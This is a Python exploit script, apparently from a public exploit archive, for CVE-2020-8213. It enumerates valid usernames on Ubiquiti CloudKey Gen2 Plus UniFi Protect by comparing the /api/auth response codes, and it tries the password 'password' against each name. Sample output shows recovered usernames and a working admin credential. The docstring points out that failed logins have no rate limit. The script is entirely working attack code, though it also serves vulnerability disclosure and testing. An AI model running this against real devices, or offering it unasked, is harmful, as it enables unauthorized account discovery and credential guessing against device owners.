# Exploit Title: Ubiquiti CloudKey Gen2 Plus UniFi Protect HTTP Username Discovery
# Date: 07/15/2020
# Exploit Author: Katie Sexton
# Vendor Homepage: http://www.ui.com/
# Software Link: https://www.ui.com/download/unifi/unifi-cloud-key-gen2
# Version: CloudKey Firmware 1.1.13 and below / UniFi Protect 1.13.3 and below
# Tested on: Ubiquiti UniFi CloudKey Gen2 Plus Firmware 1.1.13 / UniFi Protect 1.13.3
# CVE : CVE-2020-8213
# Advisory: https://www.tenable.com/security/research/tra-2020-45
# Sample output:
#
# $python3 cve_2020_8213_test_unifi_protect_usernames.py -t 192.168.30.6 admin root nvr-admin ubnt user newuser -d
# [+] Getting connection to host 192.168.30.6, port 7443
# [+] Trying username: admin
# [!] Found valid username / password: admin / password
# [+] Trying username: root
# [+] Trying username: nvr-admin
# [!] Found potentially valid username: nvr-admin
# [+] Trying username: ubnt
# [+] Trying username: user
# [!] Found potentially valid username: user
# [+] Trying username: newuser
#
# Valid usernames:
# admin
# nvr-admin
# user
#
# Valid passwords (username / password):
# admin / password
#
# $python3 cve_2020_8213_test_unifi_protect_usernames.py -t 192.168.30.6 -f usernames.txt -d
# [+] Getting connection to host 192.168.30.6, port 7443
# [+] Trying username: admin
# [!] Found valid username / password: admin / password
# [+] Trying username: owner
# [+] Trying username: nvr-admin
# [!] Found potentially valid username: nvr-admin
# [+] Trying username: user
# [!] Found potentially valid username: user
# [+] Trying username: ubnt
#
# Valid usernames:
# admin
# nvr-admin
# user
#
# Valid passwords (username / password):
# admin / password


import argparse
import http.client
import json
import ssl
import sys
import os.path
import time


TIMEOUT = None
DEBUG = False


def debug(message):
    if not DEBUG:
        return None
    print("[+] {}".format(message))


def cli_params():
    parser = argparse.ArgumentParser(
            description="Discover valid usernames for UniFi Protect using a list of usernames.")
    parser.add_argument("-t", "--target",
                        metavar="target",
                        required=True,
                        help="The target IP or hostname")
    parser.add_argument("-p", "--port",
                        metavar="port",
                        required=False,
                        default=7443,
                        help="The target UniFi Protect UI port")
    parser.add_argument("-n", "--no-ssl",
                        action="store_true",
                        default=False,
                        help="Disable SSL")
    parser.add_argument("-s", "--seconds-timeout",
                        metavar="seconds",
                        required=False,
                        default=30,
                        help="Timeout per request")
    parser.add_argument("-f", "--file",
                        metavar="file",
                        required=False,
                        help="A file containing a list of usernames to test")
    parser.add_argument("usernames",
                        metavar="U",
                        nargs="*",
                        help="A username to test")
    parser.add_argument("-d", "--debug",
                        action="store_true",
                        default=False,
                        help="Enable debugging")
    return parser


def test_username(username, password, conn, headers, valid_usernames, valid_passwords):
    """
    Test passed username and password and store valid usernames and valid username / password
    combinations in the passed lists.
    """
    debug("Trying username: {}".format(username))
    data = {}
    data["username"] = username
    data["password"] = password
    body = json.dumps(data)
    try:
        conn.request("POST", "/api/auth", body=body, headers=headers)
    except OSError:
        exit("OSError sending to target port. Use --no-ssl or -n if target port is not an SSL port.")

    start = time.time()
    res = None
    while time.time() - start < TIMEOUT:
        try:
            res = conn.getresponse()
        except http.client.ResponseNotReady:
            continue
        except http.client.RemoteDisconnected:
            exit("Remote disconnected when getting response from target port. Do not use --no-ssl or -n if target port is an SSL port.")
        res.read()
        break

    if not res:
        debug("Response to authentication request for username '{}' timed out after {} seconds".format(username, TIMEOUT))
        return None
    if res.status == 400:
        return False
    if res.status == 401:
        print("[!] Found potentially valid username: {}".format(username))
        valid_usernames.append(username)
        return True
    if res.status == 200:
        print("[!] Found valid username / password: {} / {}".format(username, password))
        valid_usernames.append(username)
        valid_passwords.append({"username":username, "password":password})
        return True

    debug("Unexpected response: {} {}".format(res.status, res.reason))
    return None


def get_conn(host, port, use_ssl):
    """
    Connect to target host and port, using SSL unless SSL use has been disabled
    """
    debug("Getting connection to host {}, port {}".format(host, port))
    if use_ssl is False:
        return http.client.HTTPConnection(host, port)
    return http.client.HTTPSConnection(host, port, context=ssl.SSLContext())


def test_usernames(host, port, use_ssl, usernames):
    """
    Test each username in the list using a static dummy password in order to enumerate usernames.
    test_username() will also note whether the password was valid, so test using a common password.
    There does not appear to be a limit on the number of failed authentication attempts per
    connection, and further authentication attempts are allowed on the same connection after a
    successful authentication, so use a single connection for all attempts.
    """
    conn = get_conn(host, port, use_ssl)
    if not conn:
        sys.exit("Failed to connect to host {}, port {}".format(host, port))

    headers = {"Content-type": "application/json"}
    valid_usernames = []
    valid_passwords = []
    password = "password"
    for username in usernames:
        test_username(username, password, conn, headers, valid_usernames, valid_passwords)

    conn.close()
    return valid_usernames, valid_passwords


def main():
    """
    Parse CLI parameters, build list of usernames to test, call functions to test usernames, and output results
    """
    global TIMEOUT, DEBUG
    parser = cli_params()
    args = parser.parse_args()

    if not len(args.usernames) and not args.file:
        sys.exit("Argument required: -f / --file path-to-username-list OR username(s) as positional arg(s)")

    usernames = []
    if len(args.usernames):
        usernames = args.usernames
    if args.file:
        if not os.path.isfile(args.file):
            sys.exit("File {} does not exist".format(args.file))
        with open(args.file) as fp:
            for line in fp:
                usernames.append(line.rstrip())

    if not len(usernames):
        sys.exit("No usernames found in file {} or provided as positional args".format(args.file))

    use_ssl = True
    if args.no_ssl:
        use_ssl = False

    if args.debug:
        DEBUG = True

    TIMEOUT = args.seconds_timeout

    valid_usernames, valid_passwords = test_usernames(args.target, args.port, use_ssl, usernames)

    if not len(valid_usernames):
        print("No valid usernames found")
        exit(0)

    if valid_usernames == usernames:
        print("\nAll failed authentication HTTP response codes were 401, either UniFi Protect is patched or all usernames in list are valid")
    else:
        print("\nValid usernames:")
        for username in valid_usernames:
            print("{}".format(username))

    if not len (valid_passwords):
        exit(0)

    print("\nValid passwords (username / password):")
    for valid in valid_passwords:
        print("{} / {}".format(valid["username"],valid["password"]))

    print()

main()
